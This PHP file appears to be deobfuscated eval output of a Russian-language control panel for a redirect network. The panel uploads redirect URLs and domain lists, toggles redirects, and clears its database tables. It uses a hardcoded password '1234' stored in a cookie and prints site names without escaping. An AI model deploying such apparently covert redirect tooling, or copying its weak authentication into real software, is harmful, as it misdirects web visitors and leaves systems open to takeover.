<?php

$pass = "1234";
/* #1: PHPDeobfuscator eval output */ 
    require_once "validate.php";
    include "connect.php";
    if (empty($_REQUEST["p"])) {
        $_REQUEST["p"] = '';
    }
    switch ($_REQUEST["p"]) {
        default:
            if (!isset($_COOKIE["AbAbZZZZZZ"]) or $_COOKIE["AbAbZZZZZZ"] !== $pass) {
                header("Location: panel.php?p=login");
                die;
            }
            echo "<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n  <!-- Required meta tags -->\n  <meta charset=\"utf-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n  <title>Admin Dashboard</title>\n  <!-- plugins:css -->\n  <link rel=\"stylesheet\" href=\"vendors/iconfonts/simple-line-icon/css/simple-line-icons.css\">\n  <link rel=\"stylesheet\" href=\"vendors/css/vendor.bundle.base.css\">\n  <link rel=\"stylesheet\" href=\"vendors/css/vendor.bundle.addons.css\">\n  <!-- endinject -->\n  <!-- plugin css for this page -->\n  <!-- End plugin css for this page -->\n  <!-- inject:css -->\n  <link rel=\"stylesheet\" href=\"css/style.css\">\n  <!-- endinject -->\n  <link rel=\"shortcut icon\" href=\"images/favicon.png\" />\n</head>";
            echo "<body>\n  <div class=\"container-scroller\">\n\n    <!-- partial -->\n    <div class=\"container-fluid page-body-wrapper\">\n      <div class=\"main-panel\">\n      <div class=\"content-wrapper\">\n\n      <div class=\"row\">\n      <div class=\"col-md-6 grid-margin stretch-card\">\n            <div id=\"card\" class=\"card\">\n              <div id=\"card-body\" class=\"card-body\">\n                <h4 class=\"card-title\">\xd0\x94\xd0\xbe\xd0\xb1\xd0\xb0\xd0\xb2\xd0\xbb\xd0\xb5\xd0\xbd\xd0\xb8\xd0\xb5 URL \xd1\x80\xd0\xb5\xd0\xb4\xd0\xb8\xd1\x80\xd0\xb5\xd0\xba\xd1\x82\xd0\xbe\xd0\xb2</h4>\n                <p class=\"card-description\">URL \xd1\x87\xd0\xb5\xd1\x80\xd0\xb5\xd0\xb7 \xd0\xbf\xd0\xb5\xd1\x80\xd0\xb5\xd0\xbd\xd0\xbe\xd1\x81 \xd1\x81\xd1\x82\xd1\x80\xd0\xbe\xd0\xba\xd0\xb8</p>\n                <div class=\"auto-form-wrapper\">\n                <form method=\"post\" id=\"my_form\" enctype=\"multipart/form-data\">\n                  \n                  <div class=\"form-group\">\n                    <label class=\"label\">\xd0\xa4\xd0\xb0\xd0\xb9\xd0\xbb \xd1\x81\xd0\xbe \xd1\x81\xd0\xbf\xd0\xb8\xd1\x81\xd0\xba\xd0\xbe\xd0\xbc URL</label>\n                    <div class=\"input-group\">\n                    <input type=\"file\" name=\"file300\" required>\n                    </div>\n                  </div>\n\n                  \n                  <div class=\"form-group\">\n                    <button id=\"submit\" class=\"btn btn-primary submit-btn btn-block\">\xd0\x94\xd0\xbe\xd0\xb1\xd0\xb0\xd0\xb2\xd0\xb8\xd1\x82\xd1\x8c \xd1\x80\xd0\xb5\xd0\xb4\xd0\xb8\xd1\x80\xd0\xb5\xd0\xba\xd1\x82\xd1\x8b</button>\n                  </div>\n                </form>\n              </div>";
            $countLoc = mysqli_fetch_row(mysqli_query($link, "SELECT COUNT(`id`) FROM `location`"));
            echo "\xd0\x92\xd1\x81\xd0\xb5\xd0\xb3\xd0\xbe \xd1\x80\xd0\xb5\xd0\xb4\xd0\xb8\xd1\x80\xd0\xb5\xd0\xba\xd1\x82\xd0\xbe\xd0\xb2 \xd0\xb2 \xd0\xb1\xd0\xb0\xd0\xb7\xd0\xb5: <b>" . $countLoc[0] . "</b><br />";
            $rowSetting = mysqli_fetch_assoc(mysqli_query($link, "SELECT * FROM `setting`"));
            if ($rowSetting["redirect"] == 0) {
                echo "<a href=\"panel.php?p=redirect&q=1\"><button class=\"mt-2 mr-2 btn btn-outline-success\">\xd0\x92\xd0\xba\xd0\xbb\xd1\x8e\xd1\x87\xd0\xb8\xd1\x82\xd1\x8c \xd1\x80\xd0\xb5\xd0\xb4\xd0\xb8\xd1\x80\xd0\xb5\xd0\xba\xd1\x82\xd1\x8b</button></a>";
            } else {
                echo "<a href=\"panel.php?p=redirect&q=0\"><button class=\"mt-2 mr-2 btn btn-outline-danger\">\xd0\x9e\xd1\x82\xd0\xba\xd0\xbb\xd1\x8e\xd1\x87\xd0\xb8\xd1\x82\xd1\x8c \xd1\x80\xd0\xb5\xd0\xb4\xd0\xb8\xd1\x80\xd0\xb5\xd0\xba\xd1\x82\xd1\x8b</button></a>";
            }
            echo "<a href=\"panel.php?p=clearLoc\"><button class=\"mt-2 btn btn-outline-danger\">\xd0\x9e\xd1\x87\xd0\xb8\xd1\x81\xd1\x82\xd0\xb8\xd1\x82\xd1\x8c \xd0\x91\xd0\x94 \xd1\x80\xd0\xb5\xd0\xb4\xd0\xb8\xd1\x80\xd0\xb5\xd0\xba\xd1\x82\xd0\xbe\xd0\xb2</button></a>\n              </div>\n            </div>\n          </div>\n\n\n          <div class=\"col-md-6 grid-margin stretch-card\">\n          <div id=\"card\" class=\"card\">\n          <div id=\"card-body\" class=\"card-body\">\n            <h4 class=\"card-title\">\xd0\x94\xd0\xbe\xd0\xb1\xd0\xb0\xd0\xb2\xd0\xbb\xd0\xb5\xd0\xbd\xd0\xb8\xd0\xb5 \xd0\xb4\xd0\xbe\xd0\xbc\xd0\xb5\xd0\xbd\xd0\xbe\xd0\xb2</h4>\n            <p class=\"card-description\">\xd0\x94\xd0\xbe\xd0\xbc\xd0\xb5\xd0\xbd \xd1\x87\xd0\xb5\xd1\x80\xd0\xb5\xd0\xb7 \xd0\xbf\xd0\xb5\xd1\x80\xd0\xb5\xd0\xbd\xd0\xbe\xd1\x81 \xd1\x81\xd1\x82\xd1\x80\xd0\xbe\xd0\xba\xd0\xb8(\xd0\xb1\xd0\xb5\xd0\xb7 http(s))</p>\n            <div class=\"auto-form-wrapper\">\n            <form method=\"post\" id=\"my_formurl\" enctype=\"multipart/form-data\">\n              \n              <div class=\"form-group\">\n                <label class=\"label\">\xd0\xa4\xd0\xb0\xd0\xb9\xd0\xbb \xd1\x81\xd0\xbe \xd1\x81\xd0\xbf\xd0\xb8\xd1\x81\xd0\xba\xd0\xbe\xd0\xbc \xd0\xb4\xd0\xbe\xd0\xbc\xd0\xb5\xd0\xbd\xd0\xbe\xd0\xb2</label>\n                <div class=\"input-group\">\n                <input type=\"file\" name=\"file300\" required>\n                </div>\n              </div>\n\n              \n              <div class=\"form-group\">\n                <button id=\"submit\" class=\"btn btn-primary submit-btn btn-block\">\xd0\x94\xd0\xbe\xd0\xb1\xd0\xb0\xd0\xb2\xd0\xb8\xd1\x82\xd1\x8c \xd0\xb4\xd0\xbe\xd0\xbc\xd0\xb5\xd0\xbd\xd1\x8b</button>\n              </div>\n            </form>\n          </div>";
            $countDom = mysqli_fetch_row(mysqli_query($link, "SELECT COUNT(`id`) FROM `site`"));
            echo "\xd0\x92\xd1\x81\xd0\xb5\xd0\xb3\xd0\xbe \xd0\xb4\xd0\xbe\xd0\xbc\xd0\xb5\xd0\xbd\xd0\xbe\xd0\xb2 \xd0\xb2 \xd0\xb1\xd0\xb0\xd0\xb7\xd0\xb5: <b>" . $countDom[0] . "</b><br />\n          <a href=\"panel.php?p=clearPage\"><button class=\"mt-2 btn btn-outline-danger\">\xd0\xa3\xd0\xb4\xd0\xb0\xd0\xbb\xd0\xb8\xd1\x82\xd1\x8c \xd0\xb2\xd1\x81\xd0\xb5 \xd1\x81\xd1\x82\xd1\x80\xd0\xb0\xd0\xbd\xd0\xb8\xd1\x86\xd1\x8b</button></a>\n          <a href=\"panel.php?p=clearDomain\"><button class=\"mt-2 ml-2 btn btn-outline-danger\">\xd0\xa3\xd0\xb4\xd0\xb0\xd0\xbb\xd0\xb8\xd1\x82\xd1\x8c \xd0\xb2\xd1\x81\xd0\xb5 \xd0\xb4\xd0\xbe\xd0\xbc\xd0\xb5\xd0\xbd\xd1\x8b</button></a>\n          </div>\n          </div>\n      </div>\n      </div>\n      <!-- List Site -->\n          <div class=\"card\">\n            <div class=\"card-body\">\n              <h4 class=\"card-title\">\xd0\xa1\xd0\xbf\xd0\xb8\xd1\x81\xd0\xbe\xd0\xba \xd1\x81\xd0\xb0\xd0\xb9\xd1\x82\xd0\xbe\xd0\xb2</h4>\n              <div class=\"row\">";
            if ($rowSetting["rand"] == 0) {
                echo "<a href=\"panel.php?p=mode&q=1\"><button class=\"mb-3 btn btn-outline-warning\">\xd0\x92\xd0\xba\xd0\xbb\xd1\x8e\xd1\x87\xd0\xb8\xd1\x82\xd1\x8c Random \xd1\x80\xd0\xb5\xd0\xb6\xd0\xb8\xd0\xbc</button></a>";
            } else {
                echo "<a href=\"panel.php?p=mode&q=0\"><button class=\"mb-3 btn btn-outline-success\">\xd0\x92\xd0\xba\xd0\xbb\xd1\x8e\xd1\x87\xd0\xb8\xd1\x82\xd1\x8c Static \xd1\x80\xd0\xb5\xd0\xb6\xd0\xb8\xd0\xbc</button></a>";
            }
            echo "<div class=\"col-12 table-responsive\">\n                  <table id=\"order-listing\" class=\"table\">\n                    <thead>\n                      <tr>\n                          <th>ID #</th>\n                          <th>URL</th>\n                          <th>\xd0\x9a\xd0\xbe\xd0\xbb\xd0\xb8\xd1\x87\xd0\xb5\xd1\x81\xd1\x82\xd0\xb2\xd0\xbe \xd1\x81\xd1\x82\xd1\x80\xd0\xb0\xd0\xbd\xd0\xb8\xd1\x86</th>\n                          <th>\xd0\xa1\xd1\x82\xd0\xb0\xd1\x82\xd1\x83\xd1\x81</th>\n                          <th>\xd0\x94\xd0\xb5\xd0\xb9\xd1\x81\xd1\x82\xd0\xb2\xd0\xb8\xd0\xb5</th>\n                      </tr>\n                    </thead>\n                    <tbody>";
            $result = mysqli_query($link, "SELECT * FROM `site` ORDER BY `id` DESC");
            while ($row = mysqli_fetch_assoc($result)) {
                echo "\n                            <tr>\n                            <td>" . $row["id"] . "</td>\n                            <td>" . $row["name"] . "</td>";
                $countPage = mysqli_fetch_row(mysqli_query($link, "SELECT COUNT(`id`) FROM `page` WHERE `uid`='" . $row["id"] . "'"));
                echo "<td>" . $countPage[0] . "</td>";
                echo "<td><label class=\"badge badge-danger\">\xd0\xa0\xd0\xb5\xd0\xb4\xd0\xb8\xd1\x80\xd0\xb5\xd0\xba\xd1\x82 \xd0\xb2\xd0\xba\xd0\xbb\xd1\x8e\xd1\x87\xd0\xb5\xd0\xbd</label>";
                echo "\n                            </td>\n                            <td>\n                              <a href=\"panel.php?p=unsetUrl&id=" . $row["id"] . "\"><button class=\"mt-2 btn btn-outline-danger\">\xd0\xa3\xd0\xb4\xd0\xb0\xd0\xbb\xd0\xb8\xd1\x82\xd1\x8c \xd1\x81\xd0\xb0\xd0\xb9\xd1\x82</button></a>\n                            </td>\n                            </tr>";
            }
            echo "             </tbody>\n                  </table>\n                </div>\n              </div>\n            </div>\n          </div>\n\n        </div>\n        <!-- content-wrapper ends -->\n        <!-- partial:partials/_footer.html -->\n        <footer class=\"footer\">\n          <div class=\"w-100 clearfix\">\n            <span class=\"text-muted d-block text-center text-sm-left d-sm-inline-block\">Copyright \xc2\xa9 2021 <a href=\"https://t.me/n0o0b7\" target=\"_blank\">n0o0b</a>. All rights reserved.</span>\n            <span class=\"float-none float-sm-right d-block mt-1 mt-sm-0 text-center\">Hand-crafted & made with <i class=\"icon-heart text-danger\"></i></span>\n          </div>\n        </footer>\n        <!-- partial -->\n      </div>\n      <!-- main-panel ends -->\n    </div>\n    <!-- page-body-wrapper ends -->\n  </div>\n  <!-- container-scroller -->\n\n  <!-- plugins:js -->\n  <script src=\"vendors/js/vendor.bundle.base.js\"></script>\n  <script src=\"vendors/js/vendor.bundle.addons.js\"></script>\n  <!-- endinject -->\n  <!-- Plugin js for this page-->\n  <!-- End plugin js for this page-->\n  <!-- inject:js -->\n  <script src=\"js/template.js\"></script>\n  <!-- endinject -->\n  <!-- Custom js for this page-->\n  <script src=\"js/data-table.js\"></script>\n  <script src=\"js/toastDemo.js\"></script>\n        <script src=\"js/desktop-notification.js\"></script>\n        <script src=\"js/setup.js\"></script>\n        <script>\$(function(){\n            \$(\"#my_form\").on(\"submit\", function(e){\n              e.preventDefault();\n              var \$that = \$(this),\n              formData = new FormData(\$that.get(0));\n              \$.ajax({\n                url: \"/result.php?p=addurl\",\n                contentType: false, \n                processData: false, \n                data: formData,\n                success: function(json){\n                  if(json){ \n                    if(json === 1){\n                      showSuccessToast();\n                      \$('#my_form')[0].reset();\n                    }\n                    else\n                    {\n                      showWarningToast();\n                    }\n                  }\n                }\n              });\n            });\n          });</script>\n          <script>\$(function(){\n            \$(\"#my_formurl\").on(\"submit\", function(e){\n              e.preventDefault();\n              var \$that = \$(this),\n              formData = new FormData(\$that.get(0));\n              \$.ajax({\n                url: \"/result.php?p=addsite\",\n                contentType: false, \n                processData: false, \n                data: formData,\n                success: function(json){\n                  if(json){ \n                    if(json === 1){\n                      showSuccessToast();\n                      \$('#my_formurl')[0].reset();\n                    }\n                    else\n                    {\n                      showWarningToast();\n                    }\n                  }\n                }\n              });\n            });\n          });</script>\n  <!-- End custom js for this page-->\n</body>\n</html>";
            break;
        case "redirect":
            if (!isset($_COOKIE["AbAbZZZZZZ"]) or $_COOKIE["AbAbZZZZZZ"] !== $pass) {
                header("Location: panel.php?p=login");
                die;
            }
            mysqli_query($link, "UPDATE `setting` SET `redirect`='" . intval($_GET["q"]) . "'");
            header("Location: panel.php");
            break;
        case "mode":
            if (!isset($_COOKIE["AbAbZZZZZZ"]) or $_COOKIE["AbAbZZZZZZ"] !== $pass) {
                header("Location: panel.php?p=login");
                die;
            }
            mysqli_query($link, "UPDATE `setting` SET `rand`='" . intval($_GET["q"]) . "'");
            header("Location: panel.php");
            break;
        case "clearLoc":
            if (!isset($_COOKIE["AbAbZZZZZZ"]) or $_COOKIE["AbAbZZZZZZ"] !== $pass) {
                header("Location: panel.php?p=login");
                die;
            }
            mysqli_query($link, "TRUNCATE TABLE `location`");
            header("Location: panel.php");
            break;
        case "clearPage":
            if (!isset($_COOKIE["AbAbZZZZZZ"]) or $_COOKIE["AbAbZZZZZZ"] !== $pass) {
                header("Location: panel.php?p=login");
                die;
            }
            mysqli_query($link, "TRUNCATE TABLE `page`");
            header("Location: panel.php");
            break;
        case "clearDomain":
            if (!isset($_COOKIE["AbAbZZZZZZ"]) or $_COOKIE["AbAbZZZZZZ"] !== $pass) {
                header("Location: panel.php?p=login");
                die;
            }
            mysqli_query($link, "TRUNCATE TABLE `page`");
            mysqli_query($link, "TRUNCATE TABLE `site`");
            header("Location: panel.php");
            break;
        case "unsetUrl":
            if (!isset($_COOKIE["AbAbZZZZZZ"]) or $_COOKIE["AbAbZZZZZZ"] !== $pass) {
                header("Location: panel.php?p=login");
                die;
            }
            $siteId = intval($_GET["id"]);
            mysqli_query($link, "DELETE FROM `page` WHERE `uid`='{$siteId}'");
            mysqli_query($link, "DELETE FROM `site` WHERE `id`='{$siteId}'");
            header("Location: panel.php");
            break;
        case "login":
            if (isset($_POST["password"])) {
                if ($_POST["password"] == $pass) {
                    setcookie("AbAbZZZZZZ", $_POST["password"], time() + 999999);
                    header("Location: panel.php");
                } else {
                    header("Location: panel.php?p=login");
                }
            } else {
                echo "<!DOCTYPE html>\n    <html lang=\"en\">\n    \n    <head>\n      <!-- Required meta tags -->\n      <meta charset=\"utf-8\">\n      <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n      <title>Login - Admin Dashboard</title>\n      <!-- plugins:css -->\n      <link rel=\"stylesheet\" href=\"vendors/iconfonts/simple-line-icon/css/simple-line-icons.css\">\n      <link rel=\"stylesheet\" href=\"vendors/css/vendor.bundle.base.css\">\n      <link rel=\"stylesheet\" href=\"vendors/css/vendor.bundle.addons.css\">\n      <!-- endinject -->\n      <!-- plugin css for this page -->\n      <!-- End plugin css for this page -->\n      <!-- inject:css -->\n      <link rel=\"stylesheet\" href=\"css/style.css\">\n      <!-- endinject -->\n      <link rel=\"shortcut icon\" href=\"images/favicon.png\" />\n    </head>\n    \n    <body>\n      <div class=\"container-scroller\">\n        <div class=\"container-fluid page-body-wrapper full-page-wrapper\">\n          <div class=\"content-wrapper d-flex align-items-center auth theme-one\">\n            <div class=\"row w-100 mx-auto\">\n              <div class=\"col-lg-4 mx-auto\">\n                <div class=\"auto-form-wrapper\">\n                  <form method=\"post\" action=\"panel.php?p=login\">\n                    <div class=\"form-group\">\n                      <label class=\"label\">Password</label>\n                      <div class=\"input-group\">\n                        <input name=\"password\" type=\"password\" class=\"form-control\" placeholder=\"*********\" required>\n                        <div class=\"input-group-append\">\n                          <span class=\"input-group-text\"><i class=\"icon-check\"></i></span>\n                        </div>\n                      </div>\n                    </div>\n                    <div class=\"form-group\">\n                      <button class=\"btn btn-primary submit-btn btn-block\">Login</button>\n                    </div>\n                  </form>\n                </div>\n              </div>\n            </div>\n          </div>\n          <!-- content-wrapper ends -->\n        </div>\n        <!-- page-body-wrapper ends -->\n      </div>\n      <!-- container-scroller -->\n      <!-- plugins:js -->\n      <script src=\"vendors/js/vendor.bundle.base.js\"></script>\n      <script src=\"vendors/js/vendor.bundle.addons.js\"></script>\n      <!-- endinject -->\n      <!-- inject:js -->\n      <script src=\"js/template.js\"></script>\n      <!-- endinject -->\n    </body>\n    </html>";
            }
            break;
    }
/* END:#1 */
